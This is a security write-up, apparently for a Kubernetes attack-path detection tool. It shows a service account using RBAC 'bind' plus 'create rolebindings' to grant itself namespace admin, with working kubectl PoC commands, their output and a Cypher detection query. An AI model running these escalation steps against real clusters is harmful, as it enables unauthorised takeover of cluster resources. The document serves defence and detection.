### Summary
Kubernetes blocks RoleBindings that grant permissions you don't already have. The `bind` verb is an exception: with `bind` on a Role plus `create` on `rolebindings`, a subject can bind that Role to itself and get all of its permissions. This is documented RBAC behavior, not a bug, but `bind` looks harmless and is easy to grant by mistake.

### Details
| Object | Grants |
|---|---|
| Role `victim-admin-role` | everything (`*` on `*`) in `06-rolebinding-escalation` |
| Role `role-binder` | `get`/`list`/`watch`/`create` on `rolebindings`, and `bind` on `victim-admin-role` only |
| ServiceAccount `sa-binder` | bound to `role-binder`, nothing else |
| Pod `attacker-pod` | runs as `sa-binder` with its token mounted |

The attack:
1. With `sa-binder`'s token, create a RoleBinding that binds `victim-admin-role` to `sa-binder`.
2. The API server allows it because of `bind` - without it, the request is denied since `sa-binder` doesn't hold those permissions.
3. `sa-binder` is now admin of the namespace.

### PoC
Deploy:
```
$ kubectl apply -f 06-sa-rolebinding-bind-privesc.yaml
```

Confirm the starting state - no access, but able to bind the target role:
```
$ kubectl auth can-i create secrets --as=system:serviceaccount:06-rolebinding-escalation:sa-binder -n 06-rolebinding-escalation
no

$ kubectl auth can-i bind roles/victim-admin-role --as=system:serviceaccount:06-rolebinding-escalation:sa-binder -n 06-rolebinding-escalation
yes
```

Get a token for `sa-binder` (the token mounted in `attacker-pod` works the same way):
```
$ export API="https://<API_SERVER>:6443"
$ export TOKEN=$(kubectl -n 06-rolebinding-escalation create token sa-binder)
```

List what `sa-binder` is allowed to do - only manage RoleBindings and `bind` the single Role `victim-admin-role` (the `self*` entries are granted to every authenticated user):
```
$ kubectl --insecure-skip-tls-verify --server=$API --token=$TOKEN --kubeconfig <(echo) auth can-i --list -n 06-rolebinding-escalation
Resources                                       Non-Resource URLs                      Resource Names        Verbs
roles.rbac.authorization.k8s.io                 []                                     [victim-admin-role]   [bind]
selfsubjectreviews.authentication.k8s.io        []                                     []                    [create]
selfsubjectaccessreviews.authorization.k8s.io   []                                     []                    [create]
selfsubjectrulesreviews.authorization.k8s.io    []                                     []                    [create]
rolebindings.rbac.authorization.k8s.io          []                                     []                    [get list watch create]
```

**Normal case - Kubernetes blocks the escalation.** A RoleBinding may only grant permissions you already have. `sa-binder` holds none of the permissions in the built-in `edit` role, so binding it is denied:
```
$ kubectl --insecure-skip-tls-verify --server=$API --token=$TOKEN --kubeconfig <(echo) -n 06-rolebinding-escalation create rolebinding rb-edit --clusterrole=edit --serviceaccount=06-rolebinding-escalation:sa-binder
error: failed to create rolebinding: rolebindings.rbac.authorization.k8s.io "rb-edit" is forbidden: user "system:serviceaccount:06-rolebinding-escalation:sa-binder" (groups=["system:serviceaccounts" "system:serviceaccounts:06-rolebinding-escalation" "system:authenticated"]) is attempting to grant RBAC permissions not currently held:
{APIGroups:[""], Resources:["bindings"], Verbs:["get" "list" "watch"]}
{APIGroups:[""], Resources:["configmaps"], Verbs:["create" "delete" "deletecollection" "patch" "update" "get" "list" "watch"]}
...
```

**The exception - `bind`.** `sa-binder` has the `bind` verb on `victim-admin-role`, which allows binding that role without holding its permissions:
```
$ kubectl --insecure-skip-tls-verify --server=$API --token=$TOKEN --kubeconfig <(echo) -n 06-rolebinding-escalation create rolebinding rb-privesc --role=victim-admin-role --serviceaccount=06-rolebinding-escalation:sa-binder
rolebinding.rbac.authorization.k8s.io/rb-privesc created
```

Confirm escalation:
```
$ kubectl --insecure-skip-tls-verify --server=$API --token=$TOKEN --kubeconfig <(echo) auth can-i '*' '*' -n 06-rolebinding-escalation
yes
```

`sa-binder` went from zero permissions to full namespace admin with no privileges granted directly - only `bind` + `create rolebindings`.

### Impact
Any identity holding `bind` on a powerful Role/ClusterRole plus `create` on `rolebindings`/`clusterrolebindings` can grant itself (or any other subject it controls) that role's full privileges. If the target role is namespace-admin-equivalent or `cluster-admin`, this is full privilege escalation from a near-zero starting point.

### KuberHound Detection
`bind` on `victim-admin-role` combined with `create` on `rolebindings` creates a `CAN_BIND` edge from `role-binder` to `victim-admin-role`, so pathfinding follows `sa-binder → role-binder → victim-admin-role`. Saved query `"KuberHound: Binding or escalating Roles"`:

```cypher
MATCH p=(i)-[:BOUND_TO]->(r)-[:CAN_BIND|CAN_ESCALATE]->(target) RETURN p
```

The Role also keeps the `ROLE_BIND` attack capability, used by `"KuberHound: ServiceAccounts with ROLE_BIND capability"`, and both rules are flagged as `dangerous_permissions`.

### Advisories
Not a CVE - documented, intentional RBAC behavior:
https://kubernetes.io/docs/reference/access-authn-authz/rbac/#restrictions-on-role-creation-or-update
